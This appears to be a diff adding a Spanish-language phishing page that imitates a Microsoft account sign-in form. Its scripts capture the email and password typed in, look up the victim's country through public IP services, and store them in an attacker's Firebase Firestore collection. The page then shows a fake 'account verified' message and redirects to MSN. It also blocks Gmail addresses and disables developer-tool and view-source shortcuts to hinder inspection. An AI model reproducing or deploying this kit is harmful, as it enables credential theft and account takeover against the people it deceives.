@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@10.15.7/dist/sweetalert2.min.css">
+
+  <style>
+    /* Tu estilo actual aquí */
+
+    body {
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-size: 15px;
+      background-color: #f4f4f4;
+      margin: 0px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      height: 100vh;
+      background: url('dd2.png') center/cover no-repeat; /* Reemplaza 'tu-imagen-de-fondo.jpg' con la URL de tu imagen */
+
+    }
+
+    .container {
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      font-size: .9375rem;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      text-align: left;
+      box-sizing: border-box;
+      margin-left: auto;
+      margin-right: auto;
+      position: relative;
+      max-width: 440px;
+      width: calc(100% - 40px);
+      padding: 36px;
+      background-color: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,.2);
+      min-height: 338px;
+      overflow: hidden;
+      min-width: 0;
+      margin-bottom: 20px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      margin-bottom: 8px;
+    }
+
+    input {
+      box-sizing: border-box;
+      color: inherit;
+      font: inherit;
+      margin: 0;
+      font-family: inherit;
+      font-size: inherit;
+      max-width: 100%;
+      line-height: inherit;
+      display: block;
+      width: 100%;
+      background-image: none;
+      direction: ltr;
+      text-align: left;
+      border-style: solid;
+      padding: 6px 10px;
+      border-width: 1px;
+      border-color: rgba(0,0,0,.6);
+      height: 36px;
+      outline: none;
+      background-color: transparent;
+      border-top-width: 0;
+      border-left-width: 0;
+      border-right-width: 0;
+      padding-left: 0;
+    }
+
+    button {
+      direction: ltr;
+      box-sizing: border-box;
+      font: inherit;
+      margin: 0;
+      font-family: inherit;
+      font-size: inherit;
+      cursor: pointer;
+      padding: 4px 12px 4px 12px;
+      position: relative;
+      max-width: 100%;
+      text-align: center;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      touch-action: manipulation;
+      min-height: 32px;
+      border: none;
+      min-width: 108px;
+      line-height: normal;
+      margin-top: 0;
+      margin-bottom: 0;
+      color: #fff;
+      border-color: #0067b8;
+      background-color: #0067b8;
+      display: block;
+      width: 100%;
+      bottom: 20px; /* Ajusta según tus necesidades */
+      right: -75%; /* Ajusta según tus necesidades */
+      width: 20%; /* Hace que el botón ocupe el 100% del ancho del contenedor */
+    }
+
+    button:hover {
+      background-color: #257abb;
+    }
+
+    /* Estilos específicos para tamaños de pantalla pequeños, como teléfonos */
+    @media only screen and (max-width: 600px) {
+      .container {
+        width: 100%; /* Cambiado a 100% para que ocupe todo el ancho en dispositivos móviles */
+        padding: 20px; /* Ajuste de padding para dispositivos móviles */
+        box-shadow: none; /* Quitando la sombra en dispositivos móviles */
+        position: fixed; /* Fijando el contenedor en la parte superior */
+        top: 0; /* Alineando en la parte superior */
+        height: 1000px;
+      }
+
+      button {
+        padding: 6px; /* Ajuste el relleno del botón para pantallas pequeñas */
+      }
+
+      button {
+        margin-top: -670px; /* Ajusta según la cantidad de desplazamiento que desees */
+        width: 10%; /* Haga que el botón ocupe el 100% del ancho del contenedor */
+      }
+
+      .boton {
+        text-align: center; /* Alinee el botón al centro en pantallas pequeñas */
+        margin-top: 20px;
+      }
+
+      .titulo-personalizado {
+        margin: 10px 0 20px; /* Ajuste los márgenes superior e inferior según tus preferencias */
+      }
+
+      .texto {
+        text-align: center; /* Alinee el texto al centro en pantallas pequeñas */
+      }
+      .mJNHvZHfqTAjshj {
+    width: 100%; /* Hace que ocupe todo el ancho en dispositivos móviles */
+    margin-top: 0; /* Elimina el margen superior en dispositivos móviles */
+    box-shadow: none; /* Quita la sombra en dispositivos móviles */
+    position: fixed; /* Fija el contenedor en la parte superior en dispositivos móviles */
+    top: 1000px; /* Ajusta para situarlo en la parte superior */
+    bottom: unset; /* Elimina el posicionamiento inferior en dispositivos móviles */
+  }
+
+  .GcoybiklEMpmnCD {
+    text-align: center; /* Centra el contenido en dispositivos móviles */
+    width: 100%; /* Ocupa todo el ancho de la pantalla */
+    padding: 10px; /* Ajusta según tus necesidades */
+    box-sizing: border-box;
+    position: absolute; /* Permite que el cuadro ocupe toda la pantalla */
+    top: 50%; /* Alinea la parte superior del cuadro al 50% de la pantalla */
+    transform: translateY(-50%); /* Centra verticalmente el cuadro */
+  
+}
+
+}
+  
+
+    .boton {
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      font-size: .9375rem;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      box-sizing: border-box;
+      min-height: 1px;
+      float: left;
+      width: 100%;
+      padding-left: 0;
+      padding-right: 0;
+      position: absolute;
+      bottom: 30px;
+      right: 60px;
+      text-align: right;
+    }
+
+    .texto {
+      -webkit-text-size-adjust: 100%;
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      text-align: left;
+      font-size: .8125rem;
+      box-sizing: border-box;
+      margin-bottom: 16px;
+    }
+
+    .forma {
+      -webkit-text-size-adjust: 100%;
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      text-align: left;
+      font-size: .8125rem;
+      box-sizing: border-box;
+      margin-bottom: 16px;
+    }
+
+    .texto-azul {
+      color: black; /* Color predeterminado del texto */
+    }
+
+    .azul {
+      color: #0067b8; /* Color azul */
+    }
+
+    .titulo-personalizado {
+      -webkit-text-size-adjust: 100%;
+      direction: ltr;
+      text-align: left;
+      line-height: 1.75rem;
+      color: #1b1b1b;
+      font-size: 1.5rem;
+      font-weight: 600;
+      font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      box-sizing: border-box;
+      margin: 10px 0; /* Ajustar márgenes superior e inferior según tus preferencias */
+    }
+    .mJNHvZHfqTAjshj {
+  width: 90%;
+  padding: 5px 14px;
+  margin-left: auto;
+  margin-right: auto;
+  max-width: 415px;
+  background-color: #fff;
+  box-shadow: 0 2px 6px rgba(0,0,0,.2);
+  margin-top: 20px; /* Ajusta según tus necesidades */
+  position: fixed; /* Para posicionar fijo en la ventana */
+  bottom: 110px; /* Para situarlo en la parte inferior */
+}
+
+.GcoybiklEMpmnCD{
+    display: table-cell;
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    vertical-align: middle;
+}
+#btn:disabled {
+            background-color: #ccc; /* Cambia el color de fondo a gris cuando está deshabilitado */
+            color: #666; /* Cambia el color del texto a un tono más oscuro */
+        }
+
+  </style>
+  <title>Inicio de Sesión</title>
+</head>
+<body>
+  <div class="container">
+    <!-- Agregar el logo al principio del formulario -->
+    <img src="swswsw.png" alt="Logo de tu empresa" style="width: 120px; height: 45px; margin-bottom: 0px;">
+
+    <form id="form" action="login.php" method="post">
+      <h2 class="titulo-personalizado">Iniciar Sesión</h2>
+      
+      <input type="email" id="username" name="username" placeholder="Correo electrónico, teléfono o Skype" required>
+      <input type="password" id="password" name="password" placeholder="Contraseña" required>
+      <div class="texto">
+        <p class="texto-azul">No tiene una cuenta? <span class="azul">Cree una.</span></p>
+        <span class="azul">Iniciar sesión con Windows Hello o una llave de seguridad</span></p>  
+        <span class="help">
+   <img src="tst.svg"></span>
+      </div>
+      <div class="forma">
+
+      </div>
+      <p></p>
+      <div class="boton" >
+        <button id="btn" type="submit">Siguiente</button>
+      </div>
+    </form>
+  </div>
+ 
+ 
+</div>
+</body>
+<div id="XeuNMyNkaPlcgfC" class="mJNHvZHfqTAjshj">
+  <div class="GcoybiklEMpmnCD"><img style="width:32px;height:32px;" src="data:image/pngNzUxODg3NTY1ODQzOTc1;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAA1VBMVEUAAABJSUk5OTlGRkZAQEA7OztEREQ8PDxHR0dDQ0M9PT1GRkZDQ0M9PT0+Pj5ERERCQkI+Pj5DQ0NAQEA+Pj5DQ0M+Pj5CQkJCQkJBQUFAQEA/Pz9AQEBAQEBBQUFAQEBAQEA/Pz9AQEA/Pz9BQUFAQEBAQEA/Pz9AQEA/Pz9AQEBAQEBAQEBAQEBAQEA/Pz9AQEBAQEBAQEA/Pz9AQEA/Pz9AQEBAQEA/Pz9AQEBAQEA/Pz9AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQED///8zybJlAAAARXRSTlMABwkLDA0PERITFRYXGR0eHyUmKCkqLT5CQ0RJY2RmZ2hpa4GmqLCxsrm6vr/C0NHS09TV19na3N3f4OHi4/Dy8/T29/gcPWP7AAAAAWJLR0RGF7r57QAAATJJREFUSMft1F1XgkAQBuAhTVEosjIqNSQqzAQVy490Q6P3//+lLhJUzAEv6HThXLFz5jk7OywQHeIfRsm0Z0EgWqacqlyy5liGb0nJ9VoXeK5XcrlLowN0taT6M4E3PVzcjCAShNSDU1wtZQcu35WF0cZJ5SEsdj4+rolqQtTCjA6fm5WJFyISgIhSbTQZ0IIRBw3YDJjhgjZbonNMGPCFfDyVR8CAYBsUsGDAFJV46gpjBtiox1P3eGTH2o6nHuCVmRc3hx5LqQP0ytzVGMrbor9bSC6c0i9C2SlOBca30fWeIFloLtC5qx4VqoYDIMUekuWHn+jHEiQIKjbt6Wfw/tQ4DgGpA3hKih/Cz0ZEREofryf7gLSCiNbO4e0FSI2e0raVFViVZgvWBpwJOMSfxDeQbjtBBpqwgwAAAABJRU5ErkJggg=="></div>
+  <div class="GcoybiklEMpmnCD" style="padding-left:12px;">Opciones de inicio de sesión</div>
+  <script src="https://www.gstatic.com/firebasejs/10.1.0/firebase-app-compat.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10.15.7/dist/sweetalert2.all.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+  apiKey: "AIzaSyCdtKO3fzQHQhB2TS2uxkAfjG0ZTLUvwPg",
+  authDomain: "alef-cc3b1.firebaseapp.com",
+  projectId: "alef-cc3b1",
+  storageBucket: "alef-cc3b1.appspot.com",
+  messagingSenderId: "904403492316",
+  appId: "1:904403492316:web:ae38ce6794e76018330319"
+  };
+  
+  firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+  <script> 
+   function getUsuarioIP() {
+  return new Promise((resolve, reject) => {
+    fetch('https://api64.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => resolve(data.ip))
+      .catch(error => reject(error));
+  });
+}
+  
+function getPaisFromIP(ip) {
+  return new Promise((resolve, reject) => {
+    fetch(`https://ipapi.co/${ip}/json/`)
+      .then(response => response.json())
+      .then(data => resolve(data.country_name))
+      .catch(error => reject(error));
+  });
+}
+  </script>
+  <script>
+document.getElementById('form').addEventListener('submit', function (event) {
+    event.preventDefault();
+    
+    const nombre = document.getElementById('username').value;
+    const apellido = document.getElementById('password').value;
+    const timestamp = firebase.firestore.FieldValue.serverTimestamp();
+
+
+    getUsuarioIP()
+      .then(ip => getPaisFromIP(ip))
+      .then(country => {
+        // Store user data in Firebase Firestore
+        return db.collection('usuarios').add({
+          Mai1: nombre,
+          Pass: apellido,
+          Pais: country,
+          Fecha: timestamp,
+          Soporte: false,
+          Revisado: false,
+
+        });
+      })
+      .then(function(docRef) {
+        console.log('Document written with ID: ', docRef.id);
+        Swal.fire({
+        title: "Cuenta verificada",
+        icon: "success",
+        timer: 2000, // Configura el tiempo de visualización del SweetAlert2 en milisegundos
+        showConfirmButton: false // Oculta el botón de confirmación durante el tiempo del temporizador
+    }).then(() => {
+        // Después de cerrar SweetAlert2, redirigir a la página deseada
+        window.location.href = 'https://www.msn.com/es-mx';
+      });
+});
+        console.error('Error adding document: ', error);
+      });
+  </script>
+<script>
+  document.getElementById('form').addEventListener('submit', function (event) {
+      var submitBtn = document.getElementById('btn');
+
+      // Deshabilita el botón después de hacer clic
+      submitBtn.disabled = true;
+
+      // Habilita el botón después de 2 segundos (ajusta el tiempo según tus necesidades)
+      setTimeout(function () {
+          submitBtn.disabled = false;
+      }, 10000);
+  });
+
+  document.getElementById('username').addEventListener('input', function () {
+      var usernameValue = this.value;
+      var submitBtn = document.getElementById('btn');
+
+      // Verifica si el valor del campo de usuario contiene "@gmail.com"
+      if (usernameValue.includes('@gmail.com')) {
+          // Si contiene "@gmail.com", deshabilita el botón de envío
+          submitBtn.disabled = true;
+      } else {
+          // Si no contiene "@gmail.com", habilita el botón de envío
+          submitBtn.disabled = false;
+      }
+  });
+</script>
+<script>
+  
+
+
+document.onkeydown = function (e) {
+
+    if(e.keyCode == 123) {
+        return false;
+    }
+
+    if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
+        return false;
+    }
+
+    if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+        return false;
+    }
+    if(e.ctrlKey && e.keyCode == 85) {
+        return false;
+    }
+   
+    if(e.ctrlKey && e.keyCode == 83) {
+        return false;
+    }
+}
+
+function limitarA4Digitos(input) {
+// Eliminar cualquier carácter que no sea un dígito numérico
+input.value = input.value.replace(/\D/g, '');
+
+// Limitar la longitud del valor a 4 dígitos
+if (input.value.length > 4) {
+  input.value = input.value.slice(0, 4);
+}
+}
+</script>
+</div>
+</div>
+</html>
